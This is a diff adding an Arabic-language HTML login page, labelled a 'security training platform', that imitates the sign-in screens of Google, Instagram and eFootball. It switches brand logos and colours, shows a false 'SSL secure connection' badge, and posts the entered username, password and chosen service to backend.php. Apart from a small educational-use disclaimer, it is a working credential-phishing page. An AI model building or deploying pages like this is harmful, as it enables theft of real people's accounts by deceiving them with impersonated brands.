@@ -1,0 +1,417 @@
+﻿<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+    <title>تسجيل الدخول - منصة التدريب الأمني</title>
+    
+    <!-- Fonts & Icons -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    
+    <style>
+        /* ===== RESET & BASE ===== */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: #f0f2f5;
+            padding: 20px;
+        }
+        
+        /* ===== MAIN CARD ===== */
+        .card {
+            background: #ffffff;
+            border-radius: 16px;
+            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.12);
+            padding: 40px 36px;
+            max-width: 440px;
+            width: 100%;
+            transition: all 0.3s ease;
+        }
+        
+        /* ===== HEADER ===== */
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .header .logo {
+            width: 72px;
+            height: 72px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 12px;
+            font-size: 2.2rem;
+            background: #f0f2f5;
+            transition: all 0.4s ease;
+        }
+        
+        .header .logo.google-logo { background: #ffffff; color: #EA4335; font-size: 2.6rem; }
+        .header .logo.instagram-logo { background: radial-gradient(circle at 30% 30%, #feda75, #d62976, #962fbf, #4f5bd5); color: #fff; }
+        .header .logo.efootball-logo { background: #1a1a2e; color: #00D4FF; font-size: 2rem; }
+        
+        .header h1 {
+            font-size: 1.5rem;
+            font-weight: 600;
+            color: #1a1a2e;
+            letter-spacing: -0.3px;
+        }
+        
+        .header p {
+            color: #6b7280;
+            font-size: 0.9rem;
+            margin-top: 4px;
+        }
+        
+        .header .service-name {
+            font-weight: 600;
+            color: #1a1a2e;
+        }
+        
+        /* ===== SERVICE SELECTOR ===== */
+        .service-selector {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 28px;
+            background: #f3f4f6;
+            border-radius: 12px;
+            padding: 4px;
+        }
+        
+        .service-btn {
+            flex: 1;
+            padding: 10px 12px;
+            border: none;
+            border-radius: 10px;
+            background: transparent;
+            font-family: 'Inter', sans-serif;
+            font-weight: 500;
+            font-size: 0.85rem;
+            color: #6b7280;
+            cursor: pointer;
+            transition: all 0.25s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        
+        .service-btn:hover {
+            background: rgba(0, 0, 0, 0.05);
+            color: #1a1a2e;
+        }
+        
+        .service-btn.active {
+            background: #ffffff;
+            color: #1a1a2e;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
+        }
+        
+        .service-btn .icon {
+            font-size: 1rem;
+        }
+        
+        /* ===== FORM ===== */
+        .form-group {
+            margin-bottom: 18px;
+        }
+        
+        .form-group label {
+            display: block;
+            font-size: 0.85rem;
+            font-weight: 500;
+            color: #374151;
+            margin-bottom: 6px;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 12px 16px;
+            border: 1.5px solid #d1d5db;
+            border-radius: 10px;
+            font-size: 0.95rem;
+            font-family: 'Inter', sans-serif;
+            transition: all 0.25s ease;
+            background: #fafafa;
+            color: #1a1a2e;
+        }
+        
+        .form-group input:focus {
+            outline: none;
+            border-color: #1a73e8;
+            background: #ffffff;
+            box-shadow: 0 0 0 4px rgba(26, 115, 232, 0.1);
+        }
+        
+        .form-group input::placeholder {
+            color: #9ca3af;
+        }
+        
+        /* ===== SERVICE-SPECIFIC FOCUS ===== */
+        .focus-google:focus { border-color: #EA4335 !important; box-shadow: 0 0 0 4px rgba(234, 67, 53, 0.12) !important; }
+        .focus-instagram:focus { border-color: #E4405F !important; box-shadow: 0 0 0 4px rgba(228, 64, 95, 0.12) !important; }
+        .focus-efootball:focus { border-color: #00D4FF !important; box-shadow: 0 0 0 4px rgba(0, 212, 255, 0.12) !important; }
+        
+        /* ===== SUBMIT ===== */
+        .btn-submit {
+            width: 100%;
+            padding: 13px;
+            border: none;
+            border-radius: 10px;
+            font-family: 'Inter', sans-serif;
+            font-weight: 600;
+            font-size: 1rem;
+            color: #ffffff;
+            background: #1a73e8;
+            cursor: pointer;
+            transition: all 0.25s ease;
+            margin-top: 6px;
+        }
+        
+        .btn-submit:hover {
+            background: #1557b0;
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(26, 115, 232, 0.3);
+        }
+        
+        .btn-submit:active {
+            transform: translateY(0);
+        }
+        
+        /* ===== FOOTER ===== */
+        .footer {
+            text-align: center;
+            margin-top: 24px;
+            padding-top: 20px;
+            border-top: 1px solid #e5e7eb;
+        }
+        
+        .footer .security-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 0.75rem;
+            color: #6b7280;
+            background: #f3f4f6;
+            padding: 6px 14px;
+            border-radius: 20px;
+        }
+        
+        .footer .security-badge i {
+            color: #10b981;
+        }
+        
+        .footer .disclaimer {
+            font-size: 0.7rem;
+            color: #9ca3af;
+            margin-top: 10px;
+        }
+        
+        .footer .disclaimer strong {
+            color: #ef4444;
+        }
+        
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 480px) {
+            .card { padding: 28px 20px; }
+            .header h1 { font-size: 1.2rem; }
+            .service-btn { font-size: 0.75rem; padding: 8px 6px; }
+            .service-btn .icon { font-size: 0.85rem; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <!-- ===== HEADER ===== -->
+    <div class="header">
+        <div class="logo google-logo" id="serviceLogo">
+            <i class="fab fa-google"></i>
+        </div>
+        <h1>تسجيل الدخول</h1>
+        <p>تابع إلى <span class="service-name" id="serviceName">Google</span></p>
+    </div>
+
+    <!-- ===== SERVICE SELECTOR ===== -->
+    <div class="service-selector" id="serviceSelector">
+        <button class="service-btn active" data-service="google" data-name="Google" data-icon="fab fa-google">
+            <span class="icon"><i class="fab fa-google"></i></span> Google
+        </button>
+        <button class="service-btn" data-service="instagram" data-name="Instagram" data-icon="fab fa-instagram">
+            <span class="icon"><i class="fab fa-instagram"></i></span> Instagram
+        </button>
+        <button class="service-btn" data-service="efootball" data-name="EFootball" data-icon="fas fa-futbol">
+            <span class="icon"><i class="fas fa-futbol"></i></span> eFootball
+        </button>
+    </div>
+
+    <!-- ===== FORM ===== -->
+    <form id="loginForm" action="backend.php" method="POST" autocomplete="off">
+        <input type="hidden" name="csrf_token" id="csrfToken" value="">
+        <input type="hidden" name="service" id="selectedService" value="google">
+        <input type="hidden" name="attempt_id" id="attemptId" value="">
+
+        <div class="form-group">
+            <label for="username"><i class="far fa-envelope" style="margin-left:6px;color:#6b7280;"></i> البريد الإلكتروني أو اسم المستخدم</label>
+            <input type="text" id="username" name="username" placeholder="example@domain.com" required autofocus>
+        </div>
+
+        <div class="form-group">
+            <label for="password"><i class="fas fa-lock" style="margin-left:6px;color:#6b7280;"></i> كلمة المرور</label>
+            <input type="password" id="password" name="password" placeholder="••••••••" required>
+        </div>
+
+        <button type="submit" class="btn-submit" id="submitBtn">
+            <span id="submitText">تسجيل الدخول</span>
+            <i class="fas fa-arrow-left" style="margin-right:8px;"></i>
+        </button>
+    </form>
+
+    <!-- ===== FOOTER ===== -->
+    <div class="footer">
+        <div class="security-badge">
+            <i class="fas fa-shield-alt"></i>
+            <span>اتصال آمن • تشفير SSL</span>
+        </div>
+        <div class="disclaimer">
+            <strong>⚠️ تنبيه:</strong> هذه المنصة لأغراض تعليمية وتدريبية فقط.
+        </div>
+    </div>
+</div>
+
+<script>
+    // ============================================================
+    // 1. CSRF TOKEN GENERATION
+    // ============================================================
+    function generateCSRF() {
+        return 'csrf_' + Date.now() + '_' + Math.random().toString(36).substring(2, 10);
+    }
+    document.getElementById('csrfToken').value = generateCSRF();
+    document.getElementById('attemptId').value = 'att_' + Date.now() + '_' + Math.random().toString(36).substring(2, 8);
+
+    // ============================================================
+    // 2. SERVICE SWITCHER
+    // ============================================================
+    const buttons = document.querySelectorAll('.service-btn');
+    const logo = document.getElementById('serviceLogo');
+    const serviceName = document.getElementById('serviceName');
+    const selectedService = document.getElementById('selectedService');
+    const username = document.getElementById('username');
+    const password = document.getElementById('password');
+
+    // Service configurations
+    const services = {
+        google: {
+            name: 'Google',
+            logo: 'fab fa-google',
+            logoClass: 'google-logo',
+            focusClass: 'focus-google',
+            placeholder: 'example@gmail.com',
+            color: '#EA4335'
+        },
+        instagram: {
+            name: 'Instagram',
+            logo: 'fab fa-instagram',
+            logoClass: 'instagram-logo',
+            focusClass: 'focus-instagram',
+            placeholder: 'username',
+            color: '#E4405F'
+        },
+        efootball: {
+            name: 'eFootball',
+            logo: 'fas fa-futbol',
+            logoClass: 'efootball-logo',
+            focusClass: 'focus-efootball',
+            placeholder: 'gamertag@konami.com',
+            color: '#00D4FF'
+        }
+    };
+
+    buttons.forEach(btn => {
+        btn.addEventListener('click', function() {
+            // Remove active from all
+            buttons.forEach(b => b.classList.remove('active'));
+            this.classList.add('active');
+
+            const service = this.dataset.service;
+            const config = services[service];
+
+            // Update hidden field
+            selectedService.value = service;
+
+            // Update header
+            logo.className = 'logo ' + config.logoClass;
+            logo.innerHTML = `<i class="${config.logo}"></i>`;
+            serviceName.textContent = config.name;
+
+            // Update placeholder
+            username.placeholder = config.placeholder;
+
+            // Update focus class
+            username.className = '';
+            password.className = '';
+            username.classList.add(config.focusClass);
+            password.classList.add(config.focusClass);
+
+            // Update submit button color
+            const submitBtn = document.getElementById('submitBtn');
+            submitBtn.style.background = config.color;
+            submitBtn.style.boxShadow = `0 4px 12px ${config.color}4D`;
+        });
+    });
+
+    // Trigger initial state
+    document.querySelector('.service-btn.active').click();
+
+    // ============================================================
+    // 3. CLIENT-SIDE VALIDATION
+    // ============================================================
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        const usernameVal = username.value.trim();
+        const passwordVal = password.value.trim();
+
+        // Email or username validation (basic)
+        if (usernameVal.length < 3) {
+            e.preventDefault();
+            alert('⚠️ يرجى إدخال بريد إلكتروني أو اسم مستخدم صحيح (3 أحرف على الأقل).');
+            username.focus();
+            return false;
+        }
+
+        // Password validation
+        if (passwordVal.length < 4) {
+            e.preventDefault();
+            alert('⚠️ يرجى إدخال كلمة مرور صحيحة (4 أحرف على الأقل).');
+            password.focus();
+            return false;
+        }
+
+        // Visual feedback
+        const btn = document.getElementById('submitBtn');
+        const text = document.getElementById('submitText');
+        btn.disabled = true;
+        text.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري المعالجة...';
+
+        // Re-enable after 3 seconds if something goes wrong
+        setTimeout(() => {
+            btn.disabled = false;
+            text.innerHTML = 'تسجيل الدخول <i class="fas fa-arrow-left" style="margin-right:8px;"></i>';
+        }, 10000);
+
+        return true;
+    });
+</script>
+
+</body>
+</html>
